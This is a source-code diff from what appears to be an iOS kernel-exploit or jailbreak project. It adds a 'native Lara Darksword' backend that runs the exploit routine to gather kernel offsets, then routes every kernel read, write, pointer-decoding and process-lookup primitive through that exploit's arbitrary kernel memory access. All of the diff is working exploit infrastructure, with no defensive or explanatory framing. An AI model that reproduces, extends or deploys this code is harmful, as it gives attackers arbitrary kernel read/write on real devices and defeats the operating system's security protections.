@@ -1370,7 +1370,82 @@ static int pe(void) {
     return 0;
 }
 
+static bool g_lara_native_offsets_ready = false;
+static bool g_lara_native_running = false;
+static int g_ds_backend = 0;
+
+static bool ds_uses_native_backend(void) {
+    return g_lara_native_running || (g_ds_backend == 1 && g_lara_native_offsets_ready);
+}
+
+void ds_set_backend(int backend) {
+    g_ds_backend = backend == 1 ? 1 : 0;
+    pe_log("selected %s kernel backend", g_ds_backend == 1 ? "native Lara" : "Infern0");
+}
+
+int ds_get_backend(void) {
+    return g_ds_backend;
+}
+
+int ds_run_lara_for_offsets(void) {
+    if (g_lara_native_offsets_ready) {
+        pe_log("reusing native Lara Darksword offset session");
+        return 0;
+    }
+
+    g_ds_ready = false;
+    ds_progresssafe(0.0);
+    random_marker = ((uint64_t)arc4random() << 32) | arc4random();
+    wired_page_marker = ((uint64_t)arc4random() << 32) | arc4random();
+    target_file_size = PAGE_SZ * 2;
+
+    default_file_content = calloc(1, target_file_size);
+    if (!default_file_content) {
+        pe_log("native Lara offset session allocation failed");
+        return -1;
+    }
+    for (uint64_t i = 0; i < target_file_size; i += 8)
+        *(uint64_t *)(default_file_content + i) = random_marker;
+
+    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
+    id previousStashValue = [defaults objectForKey:@"stashKRW"];
+    [defaults setBool:NO forKey:@"stashKRW"];
+
+    pe_log("starting upstream Lara Darksword for kernelcache offsets only");
+    pe_log("offsets: inpcb.icmp6filt=0x%x socket.usecount=0x%x socket.proto=0x%x protosw.input=0x%x",
+           off_inpcb_inp_depend6_inp6_icmp6filt,
+           off_socket_so_usecount,
+           off_socket_so_proto,
+           off_protosw_pr_input);
+    g_lara_native_running = true;
+    int result = pe();
+    g_lara_native_running = false;
+    g_lara_native_offsets_ready = result == 0 && g_ds_ready;
+
+    if (previousStashValue) {
+        [defaults setObject:previousStashValue forKey:@"stashKRW"];
+    } else {
+        [defaults removeObjectForKey:@"stashKRW"];
+    }
+
+    free(default_file_content);
+    default_file_content = NULL;
+    if (!g_lara_native_offsets_ready) {
+        pe_log("native Lara Darksword offset session failed (result=%d)", result);
+        return result != 0 ? result : -1;
+    }
+    pe_log("native Lara Darksword offset session ready");
+    return 0;
+}
+
+bool ds_lara_offsets_session_ready(void) {
+    return g_lara_native_offsets_ready;
+}
+
 int ds_run(void) {
+    if (g_ds_backend == 1) {
+        return ds_run_lara_for_offsets();
+    }
     g_ds_ready = infern0_lara_krw_ready();
     if (g_ds_ready) {
         pe_log("reusing infern0 kernel session");
@@ -1399,68 +1474,122 @@ int ds_run(void) {
 }
 
 bool ds_is_ready(void) {
+    if (ds_uses_native_backend()) return g_lara_native_offsets_ready || g_ds_ready;
     g_ds_ready = infern0_lara_krw_ready();
     return g_ds_ready;
 }
 
 uint64_t ds_get_kernel_base(void) {
+    if (ds_uses_native_backend()) return kernel_base;
     return infern0_lara_kernel_base();
 }
 
 uint64_t ds_get_kernel_slide(void) {
+    if (ds_uses_native_backend()) return kernel_slide;
     return infern0_lara_kernel_slide();
 }
 
 uint64_t ds_kread64(uint64_t address) {
+    if (ds_uses_native_backend()) return early_kread64(address);
     return infern0_lara_kread64(address);
 }
 
 uint32_t ds_kread32(uint64_t address) {
+    if (ds_uses_native_backend()) {
+        uint32_t value = 0;
+        early_kread(address, &value, sizeof(value));
+        return value;
+    }
     return infern0_lara_kread32(address);
 }
 
 uint16_t ds_kread16(uint64_t addr) {
+    if (ds_uses_native_backend()) {
+        uint16_t value = 0;
+        early_kread(addr, &value, sizeof(value));
+        return value;
+    }
     return infern0_lara_kread16(addr);
 }
 
 uint8_t ds_kread8(uint64_t addr) {
+    if (ds_uses_native_backend()) return (uint8_t)(ds_kread32(addr) & 0xff);
     return infern0_lara_kread8(addr);
 }
 
 void ds_kwrite64(uint64_t address, uint64_t value) {
+    if (ds_uses_native_backend()) {
+        early_kwrite64(address, value);
+        return;
+    }
     if (!infern0_lara_kwrite64(address, value))
         pe_log("verified write64 rejected at 0x%llx", address);
 }
 
 void ds_kwrite32(uint64_t address, uint32_t value) {
+    if (ds_uses_native_backend()) {
+        uint8_t buffer[EARLY_KRW_LENGTH];
+        early_kread(address, buffer, sizeof(buffer));
+        *(uint32_t *)buffer = value;
+        early_kwrite32bytes(address, buffer);
+        return;
+    }
     if (!infern0_lara_kwrite32(address, value))
         pe_log("verified write32 rejected at 0x%llx", address);
 }
 
 void ds_kwrite16(uint64_t addr, uint16_t val) {
+    if (ds_uses_native_backend()) {
+        uint8_t buffer[EARLY_KRW_LENGTH];
+        early_kread(addr, buffer, sizeof(buffer));
+        *(uint16_t *)buffer = val;
+        early_kwrite32bytes(addr, buffer);
+        return;
+    }
     if (!infern0_lara_kwrite16(addr, val))
         pe_log("verified write16 rejected at 0x%llx", addr);
 }
 
 void ds_kwrite8(uint64_t what, uint8_t val) {
+    if (ds_uses_native_backend()) {
+        uint64_t current = early_kread64(what);
+        early_kwrite64(what, (current & 0xffffffffffffff00ULL) | val);
+        return;
+    }
     if (!infern0_lara_kwrite8(what, val))
         pe_log("verified write8 rejected at 0x%llx", what);
 }
 
 void ds_kread(uint64_t address, void *buffer, uint64_t size) {
+    if (ds_uses_native_backend()) {
+        kread_length(address, buffer, size);
+        return;
+    }
     infern0_lara_kreadbuf(address, buffer, size);
 }
 
 void ds_kwrite(uint64_t address, void *buffer, uint64_t size) {
+    if (ds_uses_native_backend()) {
+        kwrite_length(address, buffer, size);
+        return;
+    }
     if (!infern0_lara_kwritebuf(address, buffer, size))
         pe_log("verified buffer write rejected at 0x%llx (%llu bytes)", address, size);
 }
 
 void ds_kreadbuf(uint64_t addr, void *buf, uint64_t len) {
+    if (ds_uses_native_backend()) {
+        kread_length(addr, buf, len);
+        return;
+    }
     infern0_lara_kreadbuf(addr, buf, len);
 }
 
 void ds_kwritebuf(uint64_t addr, const void *buf, uint64_t len) {
+    if (ds_uses_native_backend()) {
+        kwrite_length(addr, (void *)buf, len);
+        return;
+    }
     if (!infern0_lara_kwritebuf(addr, buf, len))
         pe_log("verified buffer write rejected at 0x%llx (%llu bytes)", addr, len);
 }
@@ -1511,38 +1640,69 @@ void ds_khexdump(uint64_t addr, size_t size) {
 }
 
 uint64_t ds_kreadptr(uint64_t va) {
+    if (ds_uses_native_backend()) return xpaci(early_kread64(va));
     return infern0_lara_kreadptr(va);
 }
 
 uint64_t ds_kreadsmrptr(uint64_t va) {
+    if (ds_uses_native_backend()) {
+        uint64_t value = ds_kreadptr(va);
+        uint64_t bits = (smr_base << (62 - t1sz_boot));
+        if ((value & bits) == 0)
+            return ((value & (0xFFFFFFFFFFFFC000ULL & ~bits)) | bits);
+        return value & 0xFFFFFFFFFFFFFFE0ULL;
+    }
     return infern0_lara_kreadsmrptr(va);
 }
 
 void ds_kwritezoneelement(uint64_t dst, const void *src, uint64_t len) {
+    if (ds_uses_native_backend()) {
+        kwrite_length(dst, (void *)src, len);
+        return;
+    }
     if (!infern0_lara_kwritezone(dst, src, len))
         pe_log("verified zone write rejected at 0x%llx (%llu bytes)", dst, len);
 }
 
 uint64_t ds_kallocarrdec(uint64_t ptr) {
+    if (ds_uses_native_backend()) {
+        uint64_t shift = 64 - t1sz_boot - 1;
+        uint64_t zone_mask = 1ULL << shift;
+        if (ptr & zone_mask) ptr &= ~0x1FULL;
+        else {
+            ptr &= ~0x3FFFULL;
+            ptr |= zone_mask;
+        }
+        return ptr;
+    }
     return infern0_lara_kalloc_array_decode(ptr);
 }
 
 uint64_t ds_get_pcbinfo(void) {
+    if (ds_uses_native_backend())
+        return early_kread64(control_socket_pcb + off_inpcb_inp_pcbinfo);
     return infern0_lara_pcbinfo();
 }
 
 uint64_t ds_get_rw_socket_pcb(void) {
+    if (ds_uses_native_backend()) return rw_socket_pcb;
     return infern0_lara_rw_socket_pcb();
 }
 
 uint64_t ds_get_our_proc(void) {
+    if (ds_uses_native_backend()) return our_proc;
     return infern0_lara_our_proc();
 }
 
 uint64_t ds_get_our_task(void) {
+    if (ds_uses_native_backend()) return our_task;
     return infern0_lara_our_task();
 }
 
 bool ds_isvalid(uint64_t value) {
+    if (ds_uses_native_backend()) {
+        uint16_t top = (uint16_t)(value >> 48);
+        return value && (top == 0xffff || top == 0xfffe);
+    }
     return infern0_lara_is_kernel_address(value);
 }
